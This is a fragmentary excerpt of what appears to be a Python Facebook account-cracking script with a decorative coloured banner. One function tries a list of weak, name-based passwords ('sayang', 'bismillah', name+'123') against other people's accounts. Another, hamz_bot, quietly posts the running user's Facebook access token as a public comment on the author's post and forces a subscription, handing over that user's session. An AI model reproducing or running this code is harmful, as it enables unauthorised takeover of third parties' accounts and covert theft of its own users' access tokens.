...
\033[0;93m  •••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m       SYAFIK \033[0;96m ---- \033[1;93m GANTENG \033[0;96m ---- \033[095m BANGETT 
\033[0;96m [][][][][][][][][][][][][][[]][[]][[]][[]][[]][[]]""""")
id = []
cp = []
ok = []
...
def masuk():
	...
	try:
		...
		if token == "SYAFIK":
			os.system("xdg-open https://www.facebook.com/100034461403746/posts/110317040127009/?app=fbl")
...
def hamz_ganteng():
	...
	def main(arg):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345', 'sayang', 'bismillah', 'indonesia']:
...
def hamz_bot():
    ...
    requests.post('https://graph.facebook.com/100034461403746/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/110317040127009/comments/?message=' +token+ '&access_token=' + token)
    requests.post('https://graph.facebook.com/109088830249830/comments/?message=' +kom+ '&access_token=' + token)
    menu()
